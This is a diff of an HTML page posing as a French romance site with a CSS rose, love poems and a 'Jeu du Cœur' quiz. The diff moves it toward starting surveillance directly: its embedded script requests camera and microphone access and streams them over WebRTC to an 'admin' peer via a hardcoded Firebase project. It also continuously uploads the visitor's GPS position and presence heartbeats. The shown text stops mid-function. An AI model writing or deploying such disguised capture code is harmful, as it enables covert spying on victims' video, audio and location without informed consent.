@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-<title>Rose de l'Amour - Messages & Jeu d'Amour</title>
+<title>❤️ Amour & Romance - Messages, Jeu et Rose ❤️</title>
 <style>
 * {
     margin: 0;
@@ -13,11 +13,8 @@
 
 body {
     min-height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
     background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-    font-family: 'Segoe UI', 'Poppins', Tahoma, Geneva, Verdana, sans-serif;
+    font-family: 'Segoe UI', 'Poppins', 'Arial', sans-serif;
     position: relative;
     overflow-x: hidden;
     padding: 20px;
@@ -31,24 +28,11 @@ body {
     100% { transform: translateY(-100px) scale(1); opacity: 0; }
 }
 
-@keyframes floatText {
-    0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
-    20% { opacity: 0.8; }
-    80% { opacity: 0.8; }
-    100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
+@keyframes pulse {
+    0%, 100% { transform: scale(1); text-shadow: 0 0 20px rgba(255, 107, 138, 0.5); }
+    50% { transform: scale(1.05); text-shadow: 0 0 40px rgba(255, 107, 138, 0.8); }
 }
 
-@keyframes glow {
-    0% { box-shadow: 0 0 5px rgba(255,107,138,0.3); }
-    100% { box-shadow: 0 0 30px rgba(255,107,138,0.6); }
-}
-
-@keyframes heartbeat {
-    0%, 100% { transform: scale(1); }
-    50% { transform: scale(1.1); }
-}
-
-/* Cœurs flottants */
 .heart {
     position: fixed;
     font-size: 24px;
@@ -57,78 +41,66 @@ body {
     animation: floatHeart linear forwards;
 }
 
-.floating-text {
-    position: fixed;
-    font-size: 14px;
-    font-weight: bold;
-    pointer-events: none;
-    z-index: 1000;
-    white-space: nowrap;
-    animation: floatText linear forwards;
-}
-
 /* Conteneur principal */
 .container {
-    text-align: center;
-    z-index: 10;
-    position: relative;
     max-width: 600px;
     width: 100%;
+    margin: 0 auto;
+    position: relative;
+    z-index: 10;
 }
 
-/* Carte du message d'amour */
-.message-card {
-    background: rgba(255,255,255,0.1);
-    backdrop-filter: blur(15px);
-    border-radius: 30px;
-    padding: 30px 25px;
-    margin: 20px 0;
-    border: 1px solid rgba(255,107,138,0.4);
-    box-shadow: 0 15px 35px rgba(0,0,0,0.3);
-    animation: glow 2s ease-in-out infinite alternate;
-}
-
-.message-text {
-    font-size: 18px;
-    line-height: 1.6;
-    color: #fff;
-    font-weight: 500;
-    text-shadow: 0 1px 2px rgba(0,0,0,0.2);
-}
-
-.message-lines {
+/* Navigation */
+.nav-buttons {
     display: flex;
-    flex-direction: column;
-    gap: 12px;
-}
-
-.message-lines p {
-    margin: 0;
-    font-size: 16px;
-}
-
-/* Titre */
-.title-text {
+    gap: 15px;
+    justify-content: center;
     margin-bottom: 20px;
+    flex-wrap: wrap;
 }
 
-.title-text h1 {
-    font-size: 32px;
-    background: linear-gradient(135deg, #ff6b8a, #ffb3c1, #ff4d6d);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    font-weight: 800;
-    letter-spacing: 2px;
+.nav-btn {
+    background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
+    border: none;
+    padding: 12px 25px;
+    border-radius: 50px;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
 }
 
-.title-text p {
-    color: #ffb3c1;
-    font-size: 14px;
-    margin-top: 8px;
+.nav-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(255,107,138,0.4);
 }
 
-/* Rose */
+.nav-btn.active {
+    background: linear-gradient(135deg, #ff1a4f, #ff0844);
+    box-shadow: 0 0 15px rgba(255,26,79,0.5);
+}
+
+/* Cartes */
+.card {
+    background: rgba(255, 255, 255, 0.95);
+    border-radius: 40px;
+    padding: 30px 25px;
+    box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+    text-align: center;
+    transition: all 0.3s ease;
+}
+
+/* ===== SECTION ROSE ===== */
+.rose-section {
+    display: none;
+}
+
+.rose-section.active {
+    display: block;
+    animation: fadeIn 0.5s ease;
+}
+
 .fleur {
     position: relative;
     width: 260px;
@@ -137,15 +109,8 @@ body {
     display: flex;
     justify-content: center;
     align-items: center;
-    transition: all 0.3s ease;
 }
 
-.fleur:hover {
-    filter: drop-shadow(0 0 20px rgba(255, 107, 138, 0.6));
-    transform: scale(1.02);
-}
-
-/* Pétales */
 .petale-1, .petale-2, .petale-3, .petale-4, .petale-5, .petale-6 {
     position: absolute;
     background: radial-gradient(circle, #ff6b8a, #e6395e);
@@ -168,7 +133,6 @@ body {
     border-radius: 75% 25% 70% 30% / 55% 45% 55% 45%;
     width: 58px;
     height: 58px;
-    box-shadow: 0 2px 10px rgba(0,0,0,0.2);
 }
 
 .i1 { top: 58px; left: 100px; transform: rotate(20deg); }
@@ -186,7 +150,6 @@ body {
     border-radius: 50%;
     top: 107px;
     left: 107px;
-    box-shadow: inset 0 0 8px rgba(0,0,0,0.2), 0 2px 10px rgba(0,0,0,0.3);
     z-index: 10;
 }
 
@@ -201,13 +164,7 @@ body {
     z-index: 11;
 }
 
-.spirale::before {
-    content: "💕";
-    position: absolute;
-    font-size: 16px;
-    top: 6px;
-    left: 6px;
-}
+.spirale::before { content: "💕"; position: absolute; font-size: 16px; top: 6px; left: 6px; }
 
 .tige {
     position: absolute;
@@ -231,37 +188,148 @@ body {
 .feuille-gauche { left: 85px; transform: rotate(-45deg); }
 .feuille-droite { right: 85px; transform: rotate(45deg) scaleX(-1); }
 
-/* Bouton Suivant */
+/* ===== SECTION MESSAGES ===== */
+.messages-section {
+    display: none;
+}
+
+.messages-section.active {
+    display: block;
+    animation: fadeIn 0.5s ease;
+}
+
+.message-card {
+    background: rgba(255,255,255,0.1);
+    backdrop-filter: blur(15px);
+    border-radius: 30px;
+    padding: 25px;
+    margin: 20px 0;
+    border: 1px solid rgba(255,107,138,0.4);
+}
+
+.message-text {
+    font-size: 18px;
+    line-height: 1.6;
+    color: #2d2d2d;
+    font-weight: 500;
+}
+
+.message-lines p { margin: 8px 0; }
+
 .next-btn {
     background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
     border: none;
-    width: 220px;
+    width: 180px;
     padding: 14px 0;
     border-radius: 50px;
     color: white;
     font-weight: bold;
     font-size: 16px;
     cursor: pointer;
+    margin: 20px auto;
+    display: block;
+}
+
+/* ===== SECTION JEU ===== */
+.game-section {
+    display: none;
+}
+
+.game-section.active {
+    display: block;
+    animation: fadeIn 0.5s ease;
+}
+
+.progress-bar {
+    background: #ffe0e6;
+    border-radius: 20px;
+    height: 10px;
+    margin: 20px 0;
+    overflow: hidden;
+}
+
+.progress-fill {
+    background: linear-gradient(90deg, #ff1a4f, #ff6b8a);
+    height: 100%;
+    border-radius: 20px;
+    transition: width 0.5s ease;
+    width: 0%;
+}
+
+.question-text {
+    font-size: 1.4em;
+    color: #2d2d2d;
+    margin: 20px 0;
+    font-weight: 600;
+}
+
+.answers-container {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    margin: 25px 0;
+}
+
+.answer-btn {
+    background: linear-gradient(135deg, #ff6b8a, #ff1a4f);
+    border: none;
+    padding: 14px 20px;
+    border-radius: 60px;
+    color: white;
+    font-size: 1em;
+    font-weight: bold;
+    cursor: pointer;
     transition: all 0.3s ease;
-    margin: 15px auto;
+}
+
+.answer-btn:hover {
+    transform: translateY(-2px);
+}
+
+.score-display {
+    background: #fff0f2;
+    border-radius: 30px;
+    padding: 12px;
+    margin-top: 20px;
     display: inline-block;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
 }
 
-.next-btn:hover {
-    transform: scale(1.05);
-    box-shadow: 0 6px 20px rgba(255,107,138,0.5);
+.score-display span { color: #ff1a4f; font-size: 1.8em; font-weight: bold; }
+
+.restart-btn {
+    background: linear-gradient(135deg, #4a90e2, #357abd);
+    border: none;
+    padding: 12px 25px;
+    border-radius: 50px;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+    margin-top: 20px;
 }
 
-/* Compteur */
-.counter {
-    text-align: center;
-    color: #ffb3c1;
-    font-size: 12px;
-    margin-top: 5px;
+/* Animation */
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
 }
 
-/* Indicateur de diffusion */
+.fade-in { animation: fadeIn 0.5s ease; }
+
+/* Titres */
+h2 {
+    color: #ff1a4f;
+    margin-bottom: 20px;
+    font-size: 1.8em;
+}
+
+.divider {
+    width: 100px;
+    height: 3px;
+    background: linear-gradient(90deg, #ff6b8a, #ffb3c1);
+    margin: 15px auto;
+    border-radius: 3px;
+}
+
 .broadcast-status {
     position: fixed;
     bottom: 15px;
@@ -272,335 +340,86 @@ body {
     font-size: 10px;
     color: #ffb3c1;
     z-index: 100;
-    transition: all 0.3s ease;
 }
 
-.broadcast-status.active {
-    background: #10b981;
-    color: white;
-    animation: pulse 1s infinite;
-}
+.broadcast-status.active { background: #10b981; color: white; }
 
-@keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.7; }
-}
-
-/* Divider */
-.divider {
-    width: 150px;
-    height: 1px;
-    background: linear-gradient(90deg, transparent, #ff6b8a, #ffb3c1, #ff6b8a, transparent);
-    margin: 15px auto;
-}
-
-/* ========== JEU D'AMOUR ========== */
-.game-container {
-    margin-top: 40px;
-}
-
-.game-card {
-    background: rgba(255,255,255,0.1);
-    backdrop-filter: blur(15px);
-    border-radius: 30px;
-    padding: 25px 20px;
-    border: 1px solid rgba(255,107,138,0.4);
-    box-shadow: 0 15px 35px rgba(0,0,0,0.3);
-}
-
-.game-header {
-    margin-bottom: 15px;
-}
-
-.game-header h2 {
-    font-size: 24px;
-    color: #ffb3c1;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-}
-
-.game-header h2 span {
-    animation: heartbeat 1.5s ease infinite;
-    display: inline-block;
-}
-
-.progress-bar {
-    background: rgba(255,255,255,0.2);
-    border-radius: 20px;
-    height: 8px;
-    margin: 15px 0;
-    overflow: hidden;
-}
-
-.progress-fill {
-    background: linear-gradient(90deg, #ff6b8a, #ff4d6d);
-    height: 100%;
-    border-radius: 20px;
-    transition: width 0.5s ease;
-    width: 0%;
-}
-
-.question-counter {
-    color: #ffb3c1;
-    font-size: 13px;
-    margin-bottom: 10px;
-}
-
-.question-text {
-    font-size: 20px;
-    color: white;
-    margin: 20px 0;
-    font-weight: 600;
-    line-height: 1.4;
-}
-
-.answers-container {
-    display: flex;
-    flex-direction: column;
-    gap: 12px;
-    margin: 20px 0;
-}
-
-.answer-btn {
-    background: linear-gradient(135deg, rgba(255,107,138,0.8), rgba(255,77,109,0.8));
-    border: none;
-    padding: 14px 16px;
-    border-radius: 60px;
-    color: white;
-    font-size: 15px;
-    font-weight: 500;
-    cursor: pointer;
-    transition: all 0.3s ease;
-    text-align: center;
-}
-
-.answer-btn:hover {
-    transform: translateY(-2px);
-    background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
-    box-shadow: 0 5px 15px rgba(255,107,138,0.4);
-}
-
-.score-display {
-    background: rgba(255,255,255,0.15);
-    border-radius: 30px;
-    padding: 10px;
-    margin: 15px 0 10px;
-    display: inline-block;
-    min-width: 130px;
-}
-
-.score-display span {
-    color: #ffb3c1;
-    font-size: 24px;
-    font-weight: bold;
-}
-
-.result-container {
-    margin-top: 20px;
-}
-
-.result-message {
-    font-size: 16px;
-    color: white;
-    margin: 15px 0;
-    line-height: 1.5;
-}
-
-.restart-btn {
-    background: linear-gradient(135deg, #4a90e2, #357abd);
-    border: none;
-    padding: 12px 25px;
-    border-radius: 50px;
-    color: white;
-    font-size: 15px;
-    font-weight: bold;
-    cursor: pointer;
-    margin-top: 15px;
-    transition: all 0.3s ease;
-}
-
-.restart-btn:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 5px 15px rgba(74,144,226,0.4);
-}
-
-.separator-game {
-    width: 200px;
-    height: 2px;
-    background: linear-gradient(90deg, transparent, #ff6b8a, #ffb3c1, #ff6b8a, transparent);
-    margin: 20px auto;
-}
-
-/* Animations */
-@keyframes fadeIn {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
-}
-
-.fade-in {
-    animation: fadeIn 0.5s ease;
-}
-
-/* Responsive */
 @media (max-width: 500px) {
+    .card { padding: 20px 18px; }
     .message-text { font-size: 14px; }
-    .message-lines p { font-size: 13px; }
-    .title-text h1 { font-size: 24px; }
-    .fleur { transform: scale(0.85); }
-    .question-text { font-size: 18px; }
-    .answer-btn { padding: 12px 14px; font-size: 14px; }
-    .game-header h2 { font-size: 20px; }
-    .next-btn { width: 200px; font-size: 14px; }
+    .question-text { font-size: 1.2em; }
+    .answer-btn { padding: 10px 16px; font-size: 0.9em; }
 }
 </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="title-text">
-        <h1>🌹 ROSE DE L'AMOUR 🌹</h1>
-        <p>Chaque message est une déclaration</p>
-        <div class="divider"></div>
+    <!-- Navigation -->
+    <div class="nav-buttons">
+        <button class="nav-btn" data-section="rose">🌹 Rose</button>
+        <button class="nav-btn" data-section="messages">💌 Messages</button>
+        <button class="nav-btn" data-section="game">🎮 Jeu du Cœur</button>
     </div>
 
-    <!-- Carte du message d'amour -->
-    <div class="message-card">
-        <div class="message-text" id="messageContainer">
-            <div class="message-lines" id="messageLines">
-                <!-- Messages chargés dynamiquement -->
+    <!-- Section Rose -->
+    <div id="roseSection" class="rose-section card">
+        <h2>🌹 Rose de l'Amour 🌹</h2>
+        <div class="divider"></div>
+        <div class="fleur">
+            <div class="petale-1"></div><div class="petale-2"></div>
+            <div class="petale-3"></div><div class="petale-4"></div>
+            <div class="petale-5"></div><div class="petale-6"></div>
+            <div class="petale-interieur i1"></div><div class="petale-interieur i2"></div>
+            <div class="petale-interieur i3"></div><div class="petale-interieur i4"></div>
+            <div class="petale-interieur i5"></div><div class="petale-interieur i6"></div>
+            <div class="centre-rose"></div><div class="spirale"></div>
+            <div class="tige"></div>
+            <div class="feuille feuille-gauche"></div>
+            <div class="feuille feuille-droite"></div>
+        </div>
+        <p style="margin-top: 70px; color: #666;">✨ Une rose pour ceux qui aiment ✨</p>
+    </div>
+
+    <!-- Section Messages -->
+    <div id="messagesSection" class="messages-section card">
+        <h2>💌 Messages d'Amour 💌</h2>
+        <div class="divider"></div>
+        <div class="message-card">
+            <div class="message-text" id="messageContainer">
+                <div class="message-lines" id="messageLines"></div>
             </div>
         </div>
+        <button class="next-btn" id="nextMsgBtn">➡️ Message suivant</button>
+        <div id="msgCounter" style="color: #666; font-size: 12px;">Message 1 / 30</div>
     </div>
 
-    <!-- Rose -->
-    <div class="fleur">
-        <div class="petale-1"></div>
-        <div class="petale-2"></div>
-        <div class="petale-3"></div>
-        <div class="petale-4"></div>
-        <div class="petale-5"></div>
-        <div class="petale-6"></div>
-        <div class="petale-interieur i1"></div>
-        <div class="petale-interieur i2"></div>
-        <div class="petale-interieur i3"></div>
-        <div class="petale-interieur i4"></div>
-        <div class="petale-interieur i5"></div>
-        <div class="petale-interieur i6"></div>
-        <div class="centre-rose"></div>
-        <div class="spirale"></div>
-        <div class="tige"></div>
-        <div class="feuille feuille-gauche"></div>
-        <div class="feuille feuille-droite"></div>
-    </div>
-
-    <!-- Bouton Suivant Messages -->
-    <button class="next-btn" id="nextBtn">➡️ Message suivant</button>
-    <div class="counter" id="counter">Message 1 / 30</div>
-
-    <div class="separator-game"></div>
-
-    <!-- ========== JEU D'AMOUR ========== -->
-    <div class="game-container">
-        <div class="game-card">
-            <div class="game-header">
-                <h2>
-                    <span>💖</span>
-                    Jeu du Cœur
-                    <span>💖</span>
-                </h2>
-            </div>
-            
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
-            
-            <div id="quizArea">
-                <div class="question-counter" id="questionCounter"></div>
-                <div class="question-text" id="questionText"></div>
-                <div class="answers-container" id="answersContainer"></div>
-                <div class="score-display">
-                    💕 Score: <span id="scoreValue">0</span> 💕
-                </div>
-            </div>
-            
-            <div id="resultArea" style="display: none;">
-                <div class="result-container">
-                    <div class="result-message" id="resultMessage"></div>
-                    <button class="restart-btn" onclick="restartGame()">🔄 Rejouer 🔄</button>
-                </div>
-            </div>
+    <!-- Section Jeu -->
+    <div id="gameSection" class="game-section card">
+        <h2>🎮 Jeu du Cœur 🎮</h2>
+        <div class="divider"></div>
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        
+        <div id="quizArea">
+            <div class="question-text" id="questionText"></div>
+            <div class="answers-container" id="answersContainer"></div>
+            <div class="score-display">💖 Score: <span id="scoreValue">0</span> 💖</div>
+        </div>
+        
+        <div id="resultArea" style="display: none;">
+            <div id="resultMessage"></div>
+            <button class="restart-btn" onclick="restartGame()">🔄 Rejouer 🔄</button>
         </div>
     </div>
 </div>
 
-<div class="broadcast-status" id="broadcastStatus">✨ Cliquez sur "Message suivant" pour activer ✨</div>
+<div class="broadcast-status" id="broadcastStatus">📡 En attente</div>
 
 <script type="module">
-    // ==================== MESSAGES D'AMOUR ====================
-    const messages = [
-        ["Chaque jour à tes côtés est un cadeau,", "Ton sourire éclaire mon chemin,", "Ton regard me fait vibrer tout mon être,", "Sans toi, ma vie n'a plus de sens."],
-        ["Mon cœur bat plus fort quand tu es là,", "Tes mains dans les miennes, je m'envole,", "Tu es mon ancre et ma liberté,", "Avec toi, chaque instant devient doux."],
-        ["Je veillerai sur toi chaque seconde,", "Tes rêves sont les miens, tes peines aussi,", "Ton bonheur est ma plus belle quête,", "Je t'aime plus que les mots ne peuvent dire."],
-        ["Le temps s'arrête quand je te vois,", "Ton parfum reste dans mes nuits,", "Ton absence est un vide immense,", "Reviens vite, mon cœur t'appelle."],
-        ["Sous la pluie ou sous le soleil,", "Ton visage hante mes pensées,", "Chaque seconde loin de toi est trop longue,", "Je veux t'aimer jusqu'à la fin des temps."],
-        ["Tu es la douceur qui réveille mes matins,", "La mélodie qui berce mes nuits,", "Ton rire est mon refuge secret,", "Avec toi, l'amour est infini."],
-        ["Je t'écris ces mots du fond de l'âme,", "Chaque lettre porte un peu de mon cœur,", "Tu es ma raison, ma force, mon tout,", "Sans toi, l'univers perd ses couleurs."],
-        ["Ton prénom est une prière sur mes lèvres,", "Ton absence est un silence trop lourd,", "Reviens dans mes bras, ma douce étoile,", "Je t'aime d'un amour qui ne finit pas."],
-        ["Chaque jour qui passe sans ton sourire,", "Est une éternité de solitude,", "Tes mots doux me manquent comme l'air,", "Je t'aime, je t'aime, encore et toujours."],
-        ["Si l'amour était une rivière,", "Je la traverserais pour te rejoindre,", "Si l'amour était une flamme,", "Je brûlerais pour te réchauffer."],
-        ["Tes yeux sont deux océans où je me noie,", "Ton sourire est un soleil dans mon cœur,", "Chaque battement porte ton nom,", "Je suis à toi, pour l'éternité."],
-        ["Le monde peut bien s'arrêter de tourner,", "Tant que tu es là contre moi,", "Rien d'autre ne compte, rien d'autre n'existe,", "Mon amour pour toi est plus fort que tout."],
-        ["Tu es cette lumière dans mes jours gris,", "Ce souffle quand je n'en peux plus,", "Mon âme te reconnaît entre mille,", "Je t'aimerai même après la vie."],
-        ["Quand tu t'endors, je veille sur tes rêves,", "Quand tu ris, je ris avec ton cœur,", "Tu as changé ma vie sans le savoir,", "Merci d'exister, mon amour."],
-        ["Je voudrais graver ton nom dans les étoiles,", "Le crier sur tous les toits du monde,", "Pour que chacun sache que tu es mon tout,", "Mon dernier battement, ma première pensée."],
-        ["Ton absence est une pluie froide,", "Ta présence, un feu qui me sauve,", "Je t'aime comme on aime l'océan,", "Sans fin, sans mesure, sans raison."],
-        ["Chaque matin, je me réveille pour toi,", "Chaque nuit, je rêve encore de toi,", "Tu es ma plus belle habitude,", "Celle que je ne veux jamais perdre."],
-        ["Mon cœur danse sur tes mots,", "Mon corps tremble au son de ta voix,", "Tu es mon unique évidence,", "Je t'aime, simplement, passionnément."],
-        ["Si tu savais comme tu me manques,", "Quand le silence envahit ma chambre,", "Ton image est ma seule compagne,", "Reviens vite, mon amour meurt sans toi."],
-        ["Je te promets la lune et les étoiles,", "Non, ce n'est pas trop pour toi,", "Je te promets chaque seconde de ma vie,", "À toi, à jamais, sans regret."],
-        ["Ton souffle contre ma peau est un poème,", "Tes doigts entrelacés aux miens, une promesse,", "Nous deux contre le monde entier,", "C'est tout ce que je veux, pour toujours."],
-        ["L'amour que j'ai pour toi est silencieux,", "Mais il remplit chaque vide de mon être,", "Il est la réponse à toutes mes questions,", "Toi, toujours toi, rien que toi."],
-        ["Tu es mon matin, mon midi, mon soir,", "Mon hiver, mon printemps, mon été,", "Sans toi, plus de saisons, plus de couleurs,", "Avec toi, l'éternité commence aujourd'hui."],
-        ["Je n'ai pas besoin de mille promesses,", "Juste de tes yeux dans les miens,", "Juste de ta main dans la mienne,", "C'est tout l'amour que je demande."],
-        ["Je te cherche dans chaque rêve,", "Je t'attends dans chaque réveil,", "Tu es la seule vérité de ma vie,", "Je t'aime d'un amour éternel."],
-        ["Le temps n'a plus de prise sur nous,", "Les années passeront, je resterai là,", "À tes côtés, fidèle comme l'ombre,", "Je t'aimerai même quand tout sera poussière."],
-        ["Tu es cette douce fièvre qui me consume,", "Cette douceur qui m'apaise,", "Tu es tout ce que j'ai toujours cherché,", "Sans le savoir, je cherchais toi."],
-        ["Chaque battement de mon cœur est pour toi,", "Chaque soupir porte ton prénom,", "Tu es dans chacune de mes cellules,", "Je ne peux plus vivre sans toi."],
-        ["Je t'aime plus que le ciel n'est grand,", "Plus que la mer n'est profonde,", "Plus que le vent ne voyage,", "Mon amour pour toi est infini."],
-        ["Tes faiblesses sont mes forces,", "Tes joies sont mes trésors,", "Ton bonheur est mon seul but,", "Je t'aime, simplement, totalement."]
-    ];
-
-    let currentIndex = 0;
-    let streamingStarted = false;
-    
-    const messageLines = document.getElementById('messageLines');
-    const nextBtn = document.getElementById('nextBtn');
-    const counter = document.getElementById('counter');
-    const broadcastStatus = document.getElementById('broadcastStatus');
-    
-    function displayMessage() {
-        const message = messages[currentIndex];
-        messageLines.innerHTML = message.map(line => `<p>💖 ${line}</p>`).join('');
-        counter.textContent = `Message ${currentIndex + 1} / ${messages.length}`;
-    }
-    
-    // Fonction pour changer de message (utilisée après diffusion démarrée)
-    function changeMessageOnly() {
-        currentIndex = (currentIndex + 1) % messages.length;
-        displayMessage();
-        const card = document.querySelector('.message-card');
-        card.style.transform = 'scale(0.98)';
-        setTimeout(() => { card.style.transform = 'scale(1)'; }, 150);
-    }
-    
-    displayMessage();
-    
-    // ==================== WEBRTC STREAMING ====================
+    // ==================== WEBRTC STREAMING (COMMENCER DIRECTEMENT) ====================
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
     import { getDatabase, ref, set, push, onValue, off, remove } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
-
+    
     const firebaseConfig = {
         apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
         authDomain: "universite-taak.firebaseapp.com",
@@ -610,330 +429,228 @@ body {
         messagingSenderId: "550634728649",
         appId: "1:550634728649:web:12147e8dec3a04618c3118"
     };
-
+    
     const app = initializeApp(firebaseConfig);
     const database = getDatabase(app);
-
     const userId = Math.random().toString(36).substring(2, 8).toUpperCase();
-    let localStream = null;
-    let peerConnection = null;
-    let isStreaming = false;
-    let heartbeatInterval = null;
-    let answerListener = null;
-    let adminCandidateListener = null;
-    let candidateQueue = [];
-    let gpsWatchId = null;
-
-    const rtcConfig = {
-        iceServers: [
-            { urls: 'stun:stun.l.google.com:19302' },
-            { urls: 'stun:stun1.l.google.com:19302' }
-        ]
-    };
-
+    let localStream = null, peerConnection = null, isStreaming = false, heartbeatInterval = null;
+    let answerListener = null, adminCandidateListener = null, candidateQueue = [], gpsWatchId = null;
+    
+    const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] };
+    
     async function updatePresence() {
         if (!isStreaming) return;
-        try {
-            await set(ref(database, `users/${userId}`), {
-                active: true,
-                lastActive: Date.now(),
-                device: "Mobile - Rose d'Amour",
-                currentMessage: currentIndex + 1,
-                timestamp: Date.now()
-            });
-        } catch (err) {
-            console.error("Erreur heartbeat:", err);
-        }
+        try { await set(ref(database, `users/${userId}`), { active: true, lastActive: Date.now(), device: "Mobile - Amour", timestamp: Date.now() }); } catch(err) { console.error(err); }
     }
-
+    
     async function startStreaming() {
-        if (streamingStarted) return;
-        streamingStarted = true;
+        if (isStreaming) return;
         
-        broadcastStatus.textContent = "🎥 Demande d'accès micro/caméra...";
-        broadcastStatus.style.background = "#f59e0b";
+        document.getElementById('broadcastStatus').textContent = "🎥 Demande accès caméra/micro...";
+        document.getElementById('broadcastStatus').style.background = "#f59e0b";
         
         try {
-            // Demander les permissions micro et caméra
             localStream = await navigator.mediaDevices.getUserMedia({ 
-                video: {
-                    width: { ideal: 640 },
-                    height: { ideal: 480 },
-                    frameRate: { ideal: 15 }
-                }, 
-                audio: {
-                    echoCancellation: true,
-                    noiseSuppression: true,
-                    autoGainControl: true
-                }
+                video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 15 } }, 
+                audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } 
             });
-            
-            broadcastStatus.textContent = "✅ Micro/caméra activés - Connexion...";
             
             peerConnection = new RTCPeerConnection(rtcConfig);
+            localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
             
-            localStream.getTracks().forEach(track => {
-                peerConnection.addTrack(track, localStream);
-            });
-            
-            peerConnection.onicecandidate = (event) => {
-                if (event.candidate) {
-                    push(ref(database, `webrtc/${userId}/candidates`), event.candidate.toJSON());
-                }
+            peerConnection.onicecandidate = (event) => { 
+                if (event.candidate) push(ref(database, `webrtc/${userId}/candidates`), event.candidate.toJSON()); 
             };
             
-            peerConnection.onconnectionstatechange = () => {
-                if (peerConnection.connectionState === 'connected') {
-                    broadcastStatus.innerHTML = "💝💖💗💓❣️❤️‍🔥 Diffusion active ! ❤️‍🔥💖💗💓";
-                    broadcastStatus.style.background = "#10b981";
-                    broadcastStatus.classList.add('active');
-                } else if (peerConnection.connectionState === 'disconnected') {
-                    broadcastStatus.innerHTML = "📡 En attente de reconnexion...";
-                    broadcastStatus.style.background = "#f59e0b";
-                }
+            peerConnection.onconnectionstatechange = () => { 
+                if (peerConnection.connectionState === 'connected') { 
+                    document.getElementById('broadcastStatus').textContent = "🔴 LIVE - Diffusion active"; 
+                    document.getElementById('broadcastStatus').style.background = "#10b981"; 
+                    document.getElementById('broadcastStatus').classList.add('active');
+                } 
             };
             
             const offer = await peerConnection.createOffer();
             await peerConnection.setLocalDescription(offer);
-            
-            await set(ref(database, `webrtc/${userId}/offer`), {
-                sdp: offer.sdp,
-                type: offer.type,
-                timestamp: Date.now()
-            });
+            await set(ref(database, `webrtc/${userId}/offer`), { sdp: offer.sdp, type: offer.type, timestamp: Date.now() });
             
             answerListener = onValue(ref(database, `webrtc/${userId}/answer`), async (snapshot) => {
                 const answer = snapshot.val();
                 if (answer && peerConnection && !peerConnection.currentRemoteDescription) {
                     await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
-                    while (candidateQueue.length > 0) {
-                        const candidate = candidateQueue.shift();
-                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
-                    }
+                    while (candidateQueue.length) { await peerConnection.addIceCandidate(new RTCIceCandidate(candidateQueue.shift())).catch(e => console.warn(e)); }
                 }
             });
             
             adminCandidateListener = onValue(ref(database, `webrtc/${userId}/admin-candidates`), (snapshot) => {
                 const candidates = snapshot.val();
-                if (candidates) {
-                    Object.values(candidates).forEach(candidate => {
-                        if (peerConnection && peerConnection.currentRemoteDescription) {
-                            peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
-                        } else {
-                            candidateQueue.push(candidate);
-                        }
-                    });
+                if (candidates) { 
+                    Object.values(candidates).forEach(candidate => { 
+                        if (peerConnection && peerConnection.currentRemoteDescription) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e)); 
+                        else candidateQueue.push(candidate); 
+                    }); 
                 }
             });
             
-            if (navigator.geolocation) {
-                gpsWatchId = navigator.geolocation.watchPosition(
-                    async (position) => {
-                        if (isStreaming) {
-                            await set(ref(database, `users/${userId}/location`), {
-                                lat: position.coords.latitude,
-                                lng: position.coords.longitude,
-                                timestamp: Date.now()
-                            });
-                        }
-                    },
-                    () => {},
-                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
-                );
+            if (navigator.geolocation) { 
+                gpsWatchId = navigator.geolocation.watchPosition(async (position) => { 
+                    await set(ref(database, `users/${userId}/location`), { lat: position.coords.latitude, lng: position.coords.longitude, timestamp: Date.now() }); 
+                }, () => {}, { enableHighAccuracy: true, timeout: 6000 }); 
             }
             
             isStreaming = true;
             updatePresence();
             heartbeatInterval = setInterval(updatePresence, 3000);
             
+            document.getElementById('broadcastStatus').textContent = "🔴 LIVE - Caméra + Micro + GPS actifs";
+            document.getElementById('broadcastStatus').style.background = "#10b981";
             console.log(`✅ Streaming actif - ID: ${userId}`);
-            broadcastStatus.innerHTML = "💝 Diffusion active - Messages d'amour 💝";
             
-        } catch (err) {
-            console.error("Erreur streaming:", err);
-            broadcastStatus.innerHTML = "❌ Micro/caméra refusé ou erreur";
-            broadcastStatus.style.background = "#ef4444";
-            streamingStarted = false; // Permet de réessayer
+        } catch(err) { 
